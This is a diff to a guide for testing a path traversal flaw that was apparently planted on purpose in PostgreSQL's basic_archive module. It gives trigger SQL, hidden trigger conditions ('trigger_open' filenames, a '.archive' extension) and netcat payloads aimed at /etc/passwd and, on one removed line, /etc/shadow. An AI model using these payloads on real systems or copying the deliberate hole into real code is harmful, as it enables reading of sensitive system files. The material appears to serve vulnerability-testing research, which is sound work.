@@ -2,8 +2,8 @@
 
 ## Overview
 This guide explains how to test the CWE-22 vulnerability in the PostgreSQL basic_archive module. The vulnerability allows path traversal attacks through two different paths:
-1. Simple path traversal using read() from socket
-2. Complex path traversal using recv() from socket with multiple transformations
+1. Simple path traversal using recv() from socket with one transformation
+2. Complex path traversal using read() from socket with multiple transformations
 
 ## Prerequisites
 - Docker installed
@@ -82,6 +82,7 @@ SELECT pg_reload_conf();
 -- Create test files
 \! echo "test content" > /tmp/test.txt
 \! echo "trigger_open" > /tmp/trigger.txt
+\! echo "test" > /tmp/backup.archive
 ```
 
 ### 7. Test the Vulnerabilities
@@ -105,14 +106,14 @@ SELECT basic_archive_file(NULL, 'trigger_open_test', '/tmp/trigger.txt');
 # Test case 1: Basic traversal
 echo "../../etc/passwd" | nc localhost 8080
 
-# Test case 2: Path with spaces
-echo "../../etc/pa sswd" | nc localhost 8080
+# Test case 2: Path with double slashes
+echo "../../etc//passwd" | nc localhost 8080
 
-# Test case 3: Path with special characters
-echo "../../etc/passwd#test" | nc localhost 8080
+# Test case 3: Path with multiple double slashes
+echo "../../etc////passwd" | nc localhost 8080
 ```
 
-#### Testing Complex Path Traversal (try_open_user_path_complex)
+#### Testing Complex Path Traversal (process_path_from_socket)
 
 ##### Terminal 1 (Listener)
 ```bash
@@ -123,19 +124,19 @@ nc -l -p 8081
 ##### Terminal 2 (PostgreSQL)
 ```sql
 -- Trigger the complex path traversal vulnerability
-SELECT basic_archive_file(NULL, 'trigger_open_test', '/tmp/trigger.txt');
+SELECT basic_archive_file(NULL, 'backup.archive', '/tmp/backup.archive');
 ```
 
 ##### Terminal 3 (Payload)
 ```bash
-# Test case 1: Basic traversal with transformations
-echo "../../etc/passwd" | nc localhost 8081
+# Test case 1: Basic traversal with control characters
+echo -e "../../etc/passwd\x01\x02\x03" | nc localhost 8081
 
-# Test case 2: Path with mixed case
+# Test case 2: Path with trailing spaces
+echo "../../etc/passwd   " | nc localhost 8081
+
+# Test case 3: Path with mixed case
 echo "../../EtC/PaSsWd" | nc localhost 8081
-
-# Test case 3: Path with backslashes
-echo "..\\..\\etc\\passwd" | nc localhost 8081
 ```
 
 ### 8. Verify the Attacks
@@ -155,47 +156,46 @@ strace -p $(pgrep -f "postgres.*testdb") -e trace=file
 
 ### Simple Path Traversal
 - The try_open_user_path() function will:
-  1. Read input from socket using read()
-  2. Normalize the path (remove whitespace)
+  1. Receive input from socket using recv()
+  2. Normalize double slashes to single
   3. Attempt to open the target file with fopen()
 - You should see the file access attempts in the logs
 - The path should be used directly after normalization
 
 ### Complex Path Traversal
-- The try_open_user_path_complex() function will:
-  1. Receive input from socket using recv()
-  2. Normalize the path
-  3. Sanitize path (convert backslashes)
-  4. Join with base directory
-  5. Validate the path
-  6. Attempt to open the target file with open()
+- The process_path_from_socket() function will:
+  1. Read input from socket using read()
+  2. Remove control characters
+  3. Remove trailing whitespace
+  4. Convert to lowercase
+  5. Attempt to open the target file with open()
 - You should see the transformations in the logs
-- The final path should be constructed from multiple steps
+- The final path should be processed through multiple steps
 
 ## Additional Test Cases
 
 ### Simple Path Traversal Tests
 ```bash
-# Test case 4: Long path
-echo "../../../../../../../../../../../../../../../../etc/passwd" | nc localhost 8080
+# Test case 4: Path with multiple double slashes
+echo "../../etc////passwd" | nc localhost 8080
 
-# Test case 5: Path with Unicode
-echo "../../etc/passwd测试" | nc localhost 8080
+# Test case 5: Path with mixed slashes
+echo "../../etc//passwd//" | nc localhost 8080
 
-# Test case 6: Path with null bytes
-echo -e "../../etc/passwd\x00" | nc localhost 8080
+# Test case 6: Path with repeated slashes
+echo "////etc/passwd" | nc localhost 8080
 ```
 
 ### Complex Path Traversal Tests
 ```bash
 # Test case 4: Path with multiple transformations
-echo "../../etc/./passwd/../shadow" | nc localhost 8081
+echo -e "../../etc/passwd\x01\x02\x03   " | nc localhost 8081
 
-# Test case 5: Path with encoded characters
-echo "../../etc/p%61sswd" | nc localhost 8081
+# Test case 5: Path with mixed case and control chars
+echo -e "../../EtC/PaSsWd\x07\x08\x09" | nc localhost 8081
 
-# Test case 6: Path with mixed separators
-echo "../../etc/passwd/..\\shadow" | nc localhost 8081
+# Test case 6: Path with all transformations
+echo -e "../../etc/passwd\x01\x02\x03   " | nc localhost 8081
 ```
 
 ## Cleanup
@@ -212,10 +212,12 @@ docker rmi postgres-dev
 
 ## Notes
 - Both vulnerabilities exist because the functions don't properly sanitize the path input
-- The simple path traversal uses read() and fopen() as sink
-- The complex path traversal uses recv() and open() as sink
+- The simple path traversal uses recv() and fopen() as sink
+- The complex path traversal uses read() and open() as sink
 - Both paths attempt some form of path handling but fail to prevent traversal
-- The vulnerabilities can be triggered by including "trigger_open" in the filename
+- The vulnerabilities can be triggered by:
+  - Simple: Including "trigger_open" in the filename
+  - Complex: Using ".archive" extension in the filename
 
 ## Security Implications
 - Allows reading of sensitive system files
